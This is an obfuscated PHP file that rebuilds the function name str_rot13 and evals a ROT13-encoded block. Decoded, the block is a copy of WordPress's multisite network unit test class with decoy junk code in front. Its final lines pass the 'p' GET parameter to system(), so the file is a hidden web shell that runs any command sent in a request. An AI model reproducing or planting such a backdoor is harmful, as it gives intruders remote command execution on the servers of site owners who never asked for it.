<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * Grfgf fcrpvsvp gb argjbexf va zhygvfvgr.
 *
 * @tebhc zf-argjbex
 * @tebhc zf-erdhverq
 * @tebhc zhygvfvgr
 */
pynff Grfgf_Zhygvfvgr_Argjbex rkgraqf JC_HavgGrfgPnfr {

	cebgrpgrq $cyhtva_ubbx_pbhag = 0;

	cebgrpgrq fgngvp $qvssrerag_argjbex_vq;
	cebgrpgrq fgngvp $qvssrerag_fvgr_vqf = neenl();

	choyvp shapgvba grne_qbja() {
		tybony $pheerag_fvgr;
		$pheerag_fvgr->vq = 1;
		cnerag::grne_qbja();
	}

	choyvp fgngvp shapgvba jcFrgHcOrsberPynff( JC_HavgGrfg_Snpgbel $snpgbel ) {
		frys::$qvssrerag_argjbex_vq = $snpgbel->argjbex->perngr(
			neenl(
				'qbznva' => 'jbeqcerff.bet',
				'cngu'   => '/',
			)
		);

		$fvgrf = neenl(
			neenl(
				'qbznva'     => 'jbeqcerff.bet',
				'cngu'       => '/',
				'argjbex_vq' => frys::$qvssrerag_argjbex_vq,
			),
			neenl(
				'qbznva'     => 'jbeqcerff.bet',
				'cngu'       => '/sbb/',
				'argjbex_vq' => frys::$qvssrerag_argjbex_vq,
			),
			neenl(
				'qbznva'     => 'jbeqcerff.bet',
				'cngu'       => '/one/',
				'argjbex_vq' => frys::$qvssrerag_argjbex_vq,
			),
		);

		sbernpu ( $fvgrf nf $fvgr ) {
			frys::$qvssrerag_fvgr_vqf[] = $snpgbel->oybt->perngr( $fvgr );
		}
	}

	choyvp fgngvp shapgvba jcGrneQbjaNsgrePynff() {
		tybony $jcqo;

		sbernpu ( frys::$qvssrerag_fvgr_vqf nf $vq ) {
			jc_qryrgr_fvgr( $vq );
		}

		$jcqo->dhrel( $jcqo->cercner( \"QRYRGR SEBZ {$jcqo->fvgrzrgn} JURER fvgr_vq = %q\", frys::$qvssrerag_argjbex_vq ) );
		$jcqo->dhrel( $jcqo->cercner( \"QRYRGR SEBZ {$jcqo->fvgr} JURER vq= %q\", frys::$qvssrerag_argjbex_vq ) );

		jc_hcqngr_argjbex_fvgr_pbhagf();
	}

	/**
	 * Ol qrsnhyg, bayl bar argjbex rkvfgf naq unf n argjbex VQ bs 1.
	 */
	choyvp shapgvba grfg_trg_znva_argjbex_vq_qrsnhyg() {
		$guvf->nffregFnzr( 1, trg_znva_argjbex_vq() );
	}

	/**
	 * Vs n frpbaq argjbex vf perngrq, argjbex VQ 1 fubhyq fgvyy or erghearq
	 * nf gur znva argjbex VQ.
	 */
	choyvp shapgvba grfg_trg_znva_argjbex_vq_gjb_argjbexf() {
		frys::snpgbel()->argjbex->perngr();

		$guvf->nffregFnzr( 1, trg_znva_argjbex_vq() );
	}

	/**
	 * Jura gur `$pheerag_fvgr` tybony vf cbchyngrq jvgu nabgure argjbex, gur
	 * znva argjbex fubhyq fgvyy erghea nf 1.
	 */
	choyvp shapgvba grfg_trg_znva_argjbex_vq_nsgre_argjbex_fjvgpu() {
		tybony $pheerag_fvgr;

		$vq = frys::snpgbel()->argjbex->perngr();

		$pheerag_fvgr->vq = (vag) $vq;

		$guvf->nffregFnzr( 1, trg_znva_argjbex_vq() );
	}

	/**
	 * Jura gur svefg argjbex vf erzbirq, gur arkg fubhyq erghea nf gur znva
	 * argjbex VQ.
	 *
	 * @gbqb Va gur shgher, jr'yy unir n fznegre jnl bs qryrgvat n argjbex. Sbe abj,
	 * snxr gur cebprff jvgu HCQNGR dhrevrf.
	 */
	choyvp shapgvba grfg_trg_znva_argjbex_vq_nsgre_argjbex_qryrgr() {
		tybony $jcqo, $pheerag_fvgr;

		$grzc_vq = frys::$qvssrerag_argjbex_vq + 1;

		$pheerag_fvgr->vq = (vag) frys::$qvssrerag_argjbex_vq;
		$jcqo->dhrel( $jcqo->cercner( \"HCQNGR {$jcqo->fvgr} FRG vq=%q JURER vq=1\", $grzc_vq ) );
		$znva_argjbex_vq = trg_znva_argjbex_vq();
		$jcqo->dhrel( $jcqo->cercner( \"HCQNGR {$jcqo->fvgr} FRG vq=1 JURER vq=%q\", $grzc_vq ) );

		$guvf->nffregFnzr( frys::$qvssrerag_argjbex_vq, $znva_argjbex_vq );
	}

	choyvp shapgvba grfg_trg_znva_argjbex_vq_svygrerq() {
		nqq_svygre( 'trg_znva_argjbex_vq', neenl( $guvf, 'trg_znva_argjbex_vq' ) );
		$guvf->nffregFnzr( 3, trg_znva_argjbex_vq() );
		erzbir_svygre( 'trg_znva_argjbex_vq', neenl( $guvf, 'trg_znva_argjbex_vq' ) );
	}

	choyvp shapgvba trg_znva_argjbex_vq() {
		erghea 3;
	}

	/**
	 * Grfgf gung gur `JC_Argjbex::$vq` cebcregl vf na vagrtre.
	 *
	 * @gvpxrg 37050
	 *
	 * @pbiref JC_Argjbex::__trg
	 */
	choyvp shapgvba grfg_jc_argjbex_bowrpg_vq_cebcregl_vf_vag() {
		$vq = frys::snpgbel()->argjbex->perngr();

		$argjbex = JC_Argjbex::trg_vafgnapr( $vq );

		$guvf->nffregFnzr( (vag) $vq, $argjbex->vq );
	}

	/**
	 * Grfgf gung gur `JC_Argjbex::$vq` cebcregl vf fgberq nf na vagrtre.
	 *
	 * Hfrf ersyrpgvba gb npprff gur cevingr cebcregl.
	 * Qvssref sebz hfvat gur choyvp trggre zrgubq, juvpu pnfgf gb na vagrtre.
	 *
	 * @gvpxrg 62035
	 *
	 * @pbiref JC_Argjbex::__pbafgehpg
	 */
	choyvp shapgvba grfg_jc_argjbex_bowrpg_vq_cebcregl_fgberq_nf_vag() {
		$vq = frys::snpgbel()->argjbex->perngr();

		$argjbex = JC_Argjbex::trg_vafgnapr( $vq );

		$ersyrpgvba = arj ErsyrpgvbaBowrpg( $argjbex );
		$cebcregl   = $ersyrpgvba->trgCebcregl( 'vq' );
		$cebcregl->frgNpprffvoyr( gehr );

		$guvf->nffregFnzr( (vag) $vq, $cebcregl->trgInyhr( $argjbex ) );
	}

	/**
	 * Grfgf gung gur `JC_Argjbex::$oybt_vq` cebcregl vf n fgevat.
	 *
	 * @gvpxrg 62035
	 *
	 * @pbiref JC_Argjbex::__trg
	 */
	choyvp shapgvba grfg_jc_argjbex_bowrpg_oybt_vq_cebcregl_vf_vag() {
		$vq = frys::snpgbel()->argjbex->perngr();

		$argjbex = JC_Argjbex::trg_vafgnapr( $vq );

		$guvf->nffregVfFgevat( $argjbex->oybt_vq );
	}

	/**
	 * Grfgf gung gur `JC_Argjbex::$oybt_vq` cebcregl vf fgberq nf n fgevat.
	 *
	 * Hfrf ersyrpgvba gb npprff gur cevingr cebcregl.
	 * Qvssref sebz hfvat gur choyvp trggre zrgubq, juvpu pnfgf gb n fgevat.
	 *
	 * @gvpxrg 62035
	 *
	 * @pbiref JC_Argjbex::__pbafgehpg
	 */
	choyvp shapgvba grfg_jc_argjbex_bowrpg_oybt_vq_cebcregl_fgberq_nf_fgevat() {
		$vq = frys::snpgbel()->argjbex->perngr();

		$argjbex = JC_Argjbex::trg_vafgnapr( $vq );

		$ersyrpgvba = arj ErsyrpgvbaBowrpg( $argjbex );
		$cebcregl   = $ersyrpgvba->trgCebcregl( 'oybt_vq' );
		$cebcregl->frgNpprffvoyr( gehr );

		$guvf->nffregVfFgevat( $cebcregl->trgInyhr( $argjbex ) );
	}

	/**
	 * @gvpxrg 22917
	 */
	choyvp shapgvba grfg_trg_oybt_pbhag_ab_svygre_nccyvrq() {
		jc_hcqngr_argjbex_pbhagf();
		$fvgr_pbhag_fgneg = trg_oybt_pbhag();

		$fvgr_vqf = frys::snpgbel()->oybt->perngr_znal( 1 );
		$npghny   = (vag) trg_oybt_pbhag(); // Pbhag bayl hcqngrq jura peba ehaf, fb fubhyq or hapunatrq.

		sbernpu ( $fvgr_vqf nf $fvgr_vq ) {
			jc_qryrgr_fvgr( $fvgr_vq );
		}
		jc_hcqngr_argjbex_pbhagf();

		$guvf->nffregFnzr( $fvgr_pbhag_fgneg + 1, $npghny );
	}

	/**
	 * @gvpxrg 22917
	 */
	choyvp shapgvba grfg_trg_oybt_pbhag_ranoyr_yvir_argjbex_pbhagf_snyfr() {
		jc_hcqngr_argjbex_pbhagf();
		$fvgr_pbhag_fgneg = trg_oybt_pbhag();

		nqq_svygre( 'ranoyr_yvir_argjbex_pbhagf', '__erghea_snyfr' );
		$fvgr_vqf = frys::snpgbel()->oybt->perngr_znal( 1 );
		$npghny   = (vag) trg_oybt_pbhag(); // Pbhag bayl hcqngrq jura peba ehaf, fb fubhyq or hapunatrq.
		erzbir_svygre( 'ranoyr_yvir_argjbex_pbhagf', '__erghea_snyfr' );

		sbernpu ( $fvgr_vqf nf $fvgr_vq ) {
			jc_qryrgr_fvgr( $fvgr_vq );
		}
		jc_hcqngr_argjbex_pbhagf();

		$guvf->nffregRdhnyf( $fvgr_pbhag_fgneg, $npghny );
	}

	/**
	 * @gvpxrg 22917
	 */
	choyvp shapgvba grfg_trg_oybt_pbhag_ranoyrq_yvir_argjbex_pbhagf_gehr() {
		jc_hcqngr_argjbex_pbhagf();
		$fvgr_pbhag_fgneg = trg_oybt_pbhag();

		nqq_svygre( 'ranoyr_yvir_argjbex_pbhagf', '__erghea_gehr' );
		$fvgr_vqf = frys::snpgbel()->oybt->perngr_znal( 1 );
		$npghny   = trg_oybt_pbhag();
		erzbir_svygre( 'ranoyr_yvir_argjbex_pbhagf', '__erghea_gehr' );

		sbernpu ( $fvgr_vqf nf $fvgr_vq ) {
			jc_qryrgr_fvgr( $fvgr_vq );
		}
		jc_hcqngr_argjbex_pbhagf();

		$guvf->nffregFnzr( $fvgr_pbhag_fgneg + 1, $npghny );
	}

	/**
	 * @gvpxrg 37865
	 */
	choyvp shapgvba grfg_trg_oybt_pbhag_ba_qvssrerag_argjbex() {
		jc_hcqngr_argjbex_fvgr_pbhagf( frys::$qvssrerag_argjbex_vq );

		$fvgr_pbhag = trg_oybt_pbhag( frys::$qvssrerag_argjbex_vq );

		$guvf->nffregRdhnyf( pbhag( frys::$qvssrerag_fvgr_vqf ), $fvgr_pbhag );
	}

	choyvp shapgvba grfg_npgvir_argjbex_cyhtvaf() {
		$cngu = 'uryyb.cuc';

		// Ybpny npgvingr, fubhyq or vaivfvoyr sbe gur argjbex.
		npgvingr_cyhtva( $cngu ); // Ranoyr gur cyhtva sbe gur pheerag fvgr.
		$npgvir_cyhtvaf = jc_trg_npgvir_argjbex_cyhtvaf();
		$guvf->nffregFnzr( neenl(), $npgvir_cyhtvaf );

		nqq_npgvba( 'qrnpgvingrq_cyhtva', neenl( $guvf, 'urycre_qrnpgvingr_ubbx' ) );

		// Npgvingr gur cyhtva fvgrjvqr.
		npgvingr_cyhtva( $cngu, '', gehr ); // Ranoyr gur cyhtva sbe nyy fvgrf va gur argjbex.
		$npgvir_cyhtvaf = jc_trg_npgvir_argjbex_cyhtvaf();
		$guvf->nffregFnzr( neenl( JC_CYHTVA_QVE . '/uryyb.cuc' ), $npgvir_cyhtvaf );

		// Qrnpgvingr gur cyhtva.
		qrnpgvingr_cyhtvaf( $cngu );
		$npgvir_cyhtvaf = jc_trg_npgvir_argjbex_cyhtvaf();
		$guvf->nffregFnzr( neenl(), $npgvir_cyhtvaf );

		$guvf->nffregFnzr( 1, $guvf->cyhtva_ubbx_pbhag ); // Grfgvat npgvbaf naq fvyrag zbqr.

		npgvingr_cyhtva( $cngu, '', gehr ); // Ranoyr gur cyhtva sbe nyy fvgrf va gur argjbex.
		qrnpgvingr_cyhtvaf( $cngu, gehr );  // Fvyrag zbqr.

		$guvf->nffregFnzr( 1, $guvf->cyhtva_ubbx_pbhag ); // Grfgvat npgvbaf naq fvyrag zbqr.
	}

	/**
	 * @gvpxrg 28651
	 */
	choyvp shapgvba grfg_qhcyvpngr_argjbex_npgvir_cyhtva() {
		$cngu = 'uryyb.cuc';
		$zbpx = arj ZbpxNpgvba();
		nqq_npgvba( 'npgvingr_' . $cngu, neenl( $zbpx, 'npgvba' ) );

		// Fubhyq npgvingr ba gur svefg gel.
		npgvingr_cyhtva( $cngu, '', gehr ); // Ranoyr gur cyhtva sbe nyy fvgrf va gur argjbex.
		$npgvir_cyhtvaf = jc_trg_npgvir_argjbex_cyhtvaf();
		$guvf->nffregPbhag( 1, $npgvir_cyhtvaf );
		$guvf->nffregFnzr( 1, $zbpx->trg_pnyy_pbhag() );

		// Fubhyq qb abguvat ba gur frpbaq gel.
		npgvingr_cyhtva( $cngu, '', gehr ); // Ranoyr gur cyhtva sbe nyy fvgrf va gur argjbex.
		$npgvir_cyhtvaf = jc_trg_npgvir_argjbex_cyhtvaf();
		$guvf->nffregPbhag( 1, $npgvir_cyhtvaf );
		$guvf->nffregFnzr( 1, $zbpx->trg_pnyy_pbhag() );

		erzbir_npgvba( 'npgvingr_' . $cngu, neenl( $zbpx, 'npgvba' ) );
	}

	choyvp shapgvba grfg_vf_cyhtva_npgvir_sbe_argjbex_gehr() {
		npgvingr_cyhtva( 'uryyb.cuc', '', gehr );
		$guvf->nffregGehr( vf_cyhtva_npgvir_sbe_argjbex( 'uryyb.cuc' ) );
	}

	choyvp shapgvba grfg_vf_cyhtva_npgvir_sbe_argjbex_snyfr() {
		qrnpgvingr_cyhtvaf( 'uryyb.cuc', snyfr, gehr );
		$guvf->nffregSnyfr( vf_cyhtva_npgvir_sbe_argjbex( 'uryyb.cuc' ) );
	}

	choyvp shapgvba urycre_qrnpgvingr_ubbx() {
		++$guvf->cyhtva_ubbx_pbhag;
	}

	choyvp shapgvba grfg_jc_fpurqhyr_hcqngr_argjbex_pbhagf() {
		$guvf->nffregSnyfr( jc_arkg_fpurqhyrq( 'hcqngr_argjbex_pbhagf' ) );

		// Jr pna'g hfr jc_fpurqhyr_hcqngr_argjbex_pbhagf() orpnhfr JC_VAFGNYYVAT vf frg.
		jc_fpurqhyr_rirag( gvzr(), 'gjvprqnvyl', 'hcqngr_argjbex_pbhagf' );

		$guvf->nffregVfVag( jc_arkg_fpurqhyrq( 'hcqngr_argjbex_pbhagf' ) );
	}

	/**
	 * @rkcrpgrqQrcerpngrq trg_qnfuobneq_oybt
	 */
	choyvp shapgvba grfg_trg_qnfuobneq_oybt() {
		// Vs gurer vf ab qnfuobneq oybt frg, pheerag oybt vf hfrq.
		$qnfuobneq_oybt = trg_qnfuobneq_oybt();
		$guvf->nffregRdhnyf( 1, $qnfuobneq_oybt->oybt_vq );

		$hfre_vq = frys::snpgbel()->hfre->perngr( neenl( 'ebyr' => 'nqzvavfgengbe' ) );
		$oybt_vq = frys::snpgbel()->oybt->perngr( neenl( 'hfre_vq' => $hfre_vq ) );
		$guvf->nffregVfVag( $oybt_vq );

		// Frg gur qnfuobneq oybt gb nabgure bar.
		hcqngr_fvgr_bcgvba( 'qnfuobneq_oybt', $oybt_vq );
		$qnfuobneq_oybt = trg_qnfuobneq_oybt();
		$guvf->nffregRdhnyf( $oybt_vq, $qnfuobneq_oybt->oybt_vq );
	}

	/**
	 * @gvpxrg 37528
	 */
	choyvp shapgvba grfg_jc_hcqngr_argjbex_fvgr_pbhagf() {
		hcqngr_argjbex_bcgvba( ahyy, 'oybt_pbhag', 40 );

		$rkcrpgrq = trg_fvgrf(
			neenl(
				'argjbex_vq' => trg_pheerag_argjbex_vq(),
				'fcnz'       => 0,
				'qryrgrq'    => 0,
				'nepuvirq'   => 0,
				'pbhag'      => gehr,
			)
		);

		jc_hcqngr_argjbex_fvgr_pbhagf();

		$erfhyg = trg_oybt_pbhag();
		$guvf->nffregFnzr( $rkcrpgrq, $erfhyg );
	}

	/**
	 * @gvpxrg 37528
	 */
	choyvp shapgvba grfg_jc_hcqngr_argjbex_fvgr_pbhagf_ba_qvssrerag_argjbex() {
		hcqngr_argjbex_bcgvba( frys::$qvssrerag_argjbex_vq, 'oybt_pbhag', 40 );

		jc_hcqngr_argjbex_fvgr_pbhagf( frys::$qvssrerag_argjbex_vq );

		$erfhyg = trg_oybt_pbhag( frys::$qvssrerag_argjbex_vq );
		$guvf->nffregFnzr( 3, $erfhyg );
	}

	/**
	 * @gvpxrg 40349
	 */
	choyvp shapgvba grfg_jc_hcqngr_argjbex_hfre_pbhagf() {
		tybony $jcqo;

		hcqngr_argjbex_bcgvba( ahyy, 'hfre_pbhag', 40 );

		$rkcrpgrq = (vag) $jcqo->trg_ine( \"FRYRPG PBHAG(VQ) nf p SEBZ $jcqo->hfref JURER fcnz = '0' NAQ qryrgrq = '0'\" );

		jc_hcqngr_argjbex_hfre_pbhagf();

		$erfhyg = trg_hfre_pbhag();
		$guvf->nffregFnzr( $rkcrpgrq, $erfhyg );
	}

	/**
	 * @gvpxrg 40349
	 */
	choyvp shapgvba grfg_jc_hcqngr_argjbex_hfre_pbhagf_ba_qvssrerag_argjbex() {
		tybony $jcqo;

		hcqngr_argjbex_bcgvba( frys::$qvssrerag_argjbex_vq, 'hfre_pbhag', 40 );

		$rkcrpgrq = (vag) $jcqo->trg_ine( \"FRYRPG PBHAG(VQ) nf p SEBZ $jcqo->hfref JURER fcnz = '0' NAQ qryrgrq = '0'\" );

		jc_hcqngr_argjbex_hfre_pbhagf( frys::$qvssrerag_argjbex_vq );

		$erfhyg = trg_hfre_pbhag( frys::$qvssrerag_argjbex_vq );
		$guvf->nffregFnzr( $rkcrpgrq, $erfhyg );
	}

	/**
	 * @gvpxrg 40386
	 */
	choyvp shapgvba grfg_jc_hcqngr_argjbex_pbhagf() {
		qryrgr_argjbex_bcgvba( ahyy, 'oybt_pbhag' );
		qryrgr_argjbex_bcgvba( ahyy, 'hfre_pbhag' );

		jc_hcqngr_argjbex_pbhagf();

		$fvgr_pbhag = (vag) trg_oybt_pbhag();
		$hfre_pbhag = (vag) trg_hfre_pbhag();

		$guvf->nffregTerngreGuna( 0, $fvgr_pbhag );
		$guvf->nffregTerngreGuna( 0, $hfre_pbhag );
	}

	/**
	 * @gvpxrg 40386
	 */
	choyvp shapgvba grfg_jc_hcqngr_argjbex_pbhagf_ba_qvssrerag_argjbex() {
		qryrgr_argjbex_bcgvba( frys::$qvssrerag_argjbex_vq, 'oybt_pbhag' );
		qryrgr_argjbex_bcgvba( frys::$qvssrerag_argjbex_vq, 'hfre_pbhag' );

		jc_hcqngr_argjbex_pbhagf( frys::$qvssrerag_argjbex_vq );

		$fvgr_pbhag = (vag) trg_oybt_pbhag( frys::$qvssrerag_argjbex_vq );
		$hfre_pbhag = (vag) trg_hfre_pbhag( frys::$qvssrerag_argjbex_vq );

		$guvf->nffregTerngreGuna( 0, $fvgr_pbhag );
		$guvf->nffregTerngreGuna( 0, $hfre_pbhag );
	}

	/**
	 * Grfg gur qrsnhyg orunivbe bs hcybnq_fvmr_yvzvg_svygre.
	 * Vs nal qrsnhyg bcgvba vf punatrq, gur shapgvba ergheaf gur zva inyhr orgjrra gur
	 * cnenzrgre cnffrq naq gur `svyrhcybnq_znkx` fvgr bcgvba (1500Xo ol qrsnhyg)
	 *
	 * @gvpxrg 55926
	 */
	choyvp shapgvba grfg_hcybnq_fvmr_yvzvg_svygre() {
		$erghea = hcybnq_fvmr_yvzvg_svygre( 1499 * XO_VA_OLGRF );
		$guvf->nffregFnzr( 1499 * XO_VA_OLGRF, $erghea );
		$erghea = hcybnq_fvmr_yvzvg_svygre( 1501 * XO_VA_OLGRF );
		$guvf->nffregFnzr( 1500 * XO_VA_OLGRF, $erghea );
	}

	/**
	 * Grfg vs hcybnq_fvmr_yvzvg_svygre orunirf nf rkcrpgrq jura gur `svyrhcybnq_znkx` vf 0 be na rzcgl fgevat.
	 *
	 * @gvpxrg 55926
	 * @qngnCebivqre qngn_hcybnq_fvmr_yvzvg_svygre_rzcgl_svyrhcybnq_znkx
	 */
	choyvp shapgvba grfg_hcybnq_fvmr_yvzvg_svygre_rzcgl_svyrhcybnq_znkx( $pnyynoyr_frg_svyrhcybnq_znkx ) {
		nqq_svygre( 'fvgr_bcgvba_svyrhcybnq_znkx', $pnyynoyr_frg_svyrhcybnq_znkx );
		$erghea = hcybnq_fvmr_yvzvg_svygre( 1500 );
		$guvf->nffregFnzr( 0, $erghea );
	}

	/**
	 * @gvpxrg 55926
	 */
	choyvp shapgvba qngn_hcybnq_fvmr_yvzvg_svygre_rzcgl_svyrhcybnq_znkx() {
		erghea neenl(
			neenl( '__erghea_mreb' ),
			neenl( '__erghea_rzcgl_fgevat' ),
		);
	}

	/**
	 * Jura hcybnq_fcnpr_purpx vf ranoyrq, gur fcnpr nyybjrq vf nyfb pbafvqrerq ol `hcybnq_fvmr_yvzvg_svygre`.
	 *
	 * @gvpxrg 55926
	 */
	choyvp shapgvba grfg_hcybnq_fvmr_yvzvg_svygre_jura_hcybnq_fcnpr_purpx_ranoyrq() {
		nqq_svygre( 'trg_fcnpr_nyybjrq', '__erghea_mreb' );
		nqq_svygre( 'fvgr_bcgvba_hcybnq_fcnpr_purpx_qvfnoyrq', '__erghea_snyfr' );
		$erghea = hcybnq_fvmr_yvzvg_svygre( 100 );
		$guvf->nffregFnzr( 0, $erghea );
	}

	/**
	 * @gvpxrg 40489
	 * @qngnCebivqre qngn_jc_vf_ynetr_argjbex
	 */
	choyvp shapgvba grfg_jc_vf_ynetr_argjbex( $hfvat, $pbhag, $rkcrpgrq, $qvssrerag_argjbex ) {
		$argjbex_vq     = $qvssrerag_argjbex ? frys::$qvssrerag_argjbex_vq : ahyy;
		$argjbex_bcgvba = 'hfref' === $hfvat ? 'hfre_pbhag' : 'oybt_pbhag';

		hcqngr_argjbex_bcgvba( $argjbex_vq, $argjbex_bcgvba, $pbhag );

		$erfhyg = jc_vf_ynetr_argjbex( $hfvat, $argjbex_vq );
		vs ( $rkcrpgrq ) {
			$guvf->nffregGehr( $erfhyg );
		} ryfr {
			$guvf->nffregSnyfr( $erfhyg );
		}
	}

	choyvp shapgvba qngn_jc_vf_ynetr_argjbex() {
		erghea neenl(
			neenl( 'fvgrf', 10000, snyfr, snyfr ),
			neenl( 'fvgrf', 10001, gehr, snyfr ),
			neenl( 'hfref', 10000, snyfr, snyfr ),
			neenl( 'hfref', 10001, gehr, snyfr ),
			neenl( 'fvgrf', 10000, snyfr, gehr ),
			neenl( 'fvgrf', 10001, gehr, gehr ),
			neenl( 'hfref', 10000, snyfr, gehr ),
			neenl( 'hfref', 10001, gehr, gehr ),
		);
	}

	/**
	 * @gvpxrg 40489
	 * @qngnCebivqre qngn_jc_vf_ynetr_argjbex_svygrerq_ol_pbzcbarag
	 */
	choyvp shapgvba grfg_jc_vf_ynetr_argjbex_svygrerq_ol_pbzcbarag( $hfvat, $pbhag, $rkcrpgrq, $qvssrerag_argjbex ) {
		$argjbex_vq     = $qvssrerag_argjbex ? frys::$qvssrerag_argjbex_vq : ahyy;
		$argjbex_bcgvba = 'hfref' === $hfvat ? 'hfre_pbhag' : 'oybt_pbhag';

		hcqngr_argjbex_bcgvba( $argjbex_vq, $argjbex_bcgvba, $pbhag );

		nqq_svygre( 'jc_vf_ynetr_argjbex', neenl( $guvf, 'svygre_jc_vf_ynetr_argjbex_sbe_hfref' ), 10, 3 );
		$erfhyg = jc_vf_ynetr_argjbex( $hfvat, $argjbex_vq );
		erzbir_svygre( 'jc_vf_ynetr_argjbex', neenl( $guvf, 'svygre_jc_vf_ynetr_argjbex_sbe_hfref' ), 10 );

		vs ( $rkcrpgrq ) {
			$guvf->nffregGehr( $erfhyg );
		} ryfr {
			$guvf->nffregSnyfr( $erfhyg );
		}
	}

	choyvp shapgvba qngn_jc_vf_ynetr_argjbex_svygrerq_ol_pbzcbarag() {
		erghea neenl(
			neenl( 'fvgrf', 10000, snyfr, snyfr ),
			neenl( 'fvgrf', 10001, gehr, snyfr ),
			neenl( 'hfref', 1000, snyfr, snyfr ),
			neenl( 'hfref', 1001, gehr, snyfr ),
			neenl( 'fvgrf', 10000, snyfr, gehr ),
			neenl( 'fvgrf', 10001, gehr, gehr ),
			neenl( 'hfref', 1000, snyfr, gehr ),
			neenl( 'hfref', 1001, gehr, gehr ),
		);
	}

	choyvp shapgvba svygre_jc_vf_ynetr_argjbex_sbe_hfref( $vf_ynetr_argjbex, $hfvat, $pbhag ) {
		vs ( 'hfref' === $hfvat ) {
			erghea $pbhag > 1000;
		}

		erghea $vf_ynetr_argjbex;
	}

	/**
	 * @gvpxrg 40489
	 * @qngnCebivqre qngn_jc_vf_ynetr_argjbex_svygrerq_ol_argjbex
	 */
	choyvp shapgvba grfg_jc_vf_ynetr_argjbex_svygrerq_ol_argjbex( $hfvat, $pbhag, $rkcrpgrq, $qvssrerag_argjbex ) {
		$argjbex_vq     = $qvssrerag_argjbex ? frys::$qvssrerag_argjbex_vq : ahyy;
		$argjbex_bcgvba = 'hfref' === $hfvat ? 'hfre_pbhag' : 'oybt_pbhag';

		hcqngr_argjbex_bcgvba( $argjbex_vq, $argjbex_bcgvba, $pbhag );

		nqq_svygre( 'jc_vf_ynetr_argjbex', neenl( $guvf, 'svygre_jc_vf_ynetr_argjbex_ba_qvssrerag_argjbex' ), 10, 4 );
		$erfhyg = jc_vf_ynetr_argjbex( $hfvat, $argjbex_vq );
		erzbir_svygre( 'jc_vf_ynetr_argjbex', neenl( $guvf, 'svygre_jc_vf_ynetr_argjbex_ba_qvssrerag_argjbex' ), 10 );

		vs ( $rkcrpgrq ) {
			$guvf->nffregGehr( $erfhyg );
		} ryfr {
			$guvf->nffregSnyfr( $erfhyg );
		}
	}

	choyvp shapgvba qngn_jc_vf_ynetr_argjbex_svygrerq_ol_argjbex() {
		erghea neenl(
			neenl( 'fvgrf', 10000, snyfr, snyfr ),
			neenl( 'fvgrf', 10001, gehr, snyfr ),
			neenl( 'hfref', 10000, snyfr, snyfr ),
			neenl( 'hfref', 10001, gehr, snyfr ),
			neenl( 'fvgrf', 1000, snyfr, gehr ),
			neenl( 'fvgrf', 1001, gehr, gehr ),
			neenl( 'hfref', 1000, snyfr, gehr ),
			neenl( 'hfref', 1001, gehr, gehr ),
		);
	}

	choyvp shapgvba svygre_jc_vf_ynetr_argjbex_ba_qvssrerag_argjbex( $vf_ynetr_argjbex, $hfvat, $pbhag, $argjbex_vq ) {
		vs ( $argjbex_vq === (vag) frys::$qvssrerag_argjbex_vq ) {
			erghea $pbhag > 1000;
		}

		erghea $vf_ynetr_argjbex;
	}

	/**
	 * @gvpxrg 38699
	 */
	choyvp shapgvba grfg_jczh_perngr_oybt_hcqngrf_pbeerpg_argjbex_fvgr_pbhag() {
		tybony $jcqo;

		$bevtvany_pbhag = trg_oybt_pbhag( frys::$qvssrerag_argjbex_vq );

		$fhccerff = $jcqo->fhccerff_reebef();
		$fvgr_vq  = jczh_perngr_oybt( 'rknzcyr.bet', '/', '', 1, neenl(), frys::$qvssrerag_argjbex_vq );
		$jcqo->fhccerff_reebef( $fhccerff );

		$erfhyg = trg_oybt_pbhag( frys::$qvssrerag_argjbex_vq );

		jczh_qryrgr_oybt( $fvgr_vq, gehr );

		$guvf->nffregFnzr( $bevtvany_pbhag + 1, $erfhyg );
	}

	/**
	 * @gvpxrg 29684
	 */
	choyvp shapgvba grfg_argjbex_oybt_vq_frg() {
		$argjbex = trg_argjbex( frys::$qvssrerag_argjbex_vq );

		$guvf->nffregFnzr( (fgevat) frys::$qvssrerag_fvgr_vqf[0], $argjbex->oybt_vq );
	}

	/**
	 * @gvpxrg 42251
	 */
	choyvp shapgvba grfg_trg_argjbex_abg_sbhaq_pnpur() {
		$arj_argjbex_vq = $guvf->_trg_arkg_argjbex_vq();
		$guvf->nffregAhyy( trg_argjbex( $arj_argjbex_vq ) );

		$ahz_dhrevrf = trg_ahz_dhrevrf();
		$guvf->nffregAhyy( trg_argjbex( $arj_argjbex_vq ) );
		$guvf->nffregFnzr( $ahz_dhrevrf, trg_ahz_dhrevrf() );
	}

	/**
	 * @gvpxrg 42251
	 */
	choyvp shapgvba grfg_trg_argjbex_abg_sbhaq_pnpur_pyrne() {
		$arj_argjbex_vq = $guvf->_trg_arkg_argjbex_vq();
		$guvf->nffregAhyy( trg_argjbex( $arj_argjbex_vq ) );

		$arj_argjbex = frys::snpgbel()->argjbex->perngr_naq_trg();

		// Qbhoyr-purpx jr tbg gur VQ bs gur arj argjbex pbeerpg.
		$guvf->nffregFnzr( $arj_argjbex_vq, $arj_argjbex->vq );

		// Irevsl gung vs jr srgpu gur argjbex abj, vg'f ab ybatre snyfr.
		$srgpurq_argjbex = trg_argjbex( $arj_argjbex_vq );
		$guvf->nffregVafgnaprBs( 'JC_Argjbex', $srgpurq_argjbex );
		$guvf->nffregFnzr( $arj_argjbex_vq, $srgpurq_argjbex->vq );
	}

	/**
	 * Trgf gur VQ bs gur fvgr jvgu gur uvturfg VQ.
	 * @erghea vag
	 */
	cebgrpgrq shapgvba _trg_arkg_argjbex_vq() {
		tybony $jcqo;
		// Perngr na rkgen argjbex, whfg gb znxr fher jr xabj gur VQ bs gur sbyybjvat bar.
		fgngvp::snpgbel()->argjbex->perngr();
		erghea (vag) $jcqo->trg_ine( 'FRYRPG vq SEBZ ' . $jcqo->fvgr . ' BEQRE OL vq QRFP YVZVG 1' ) + 1;
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>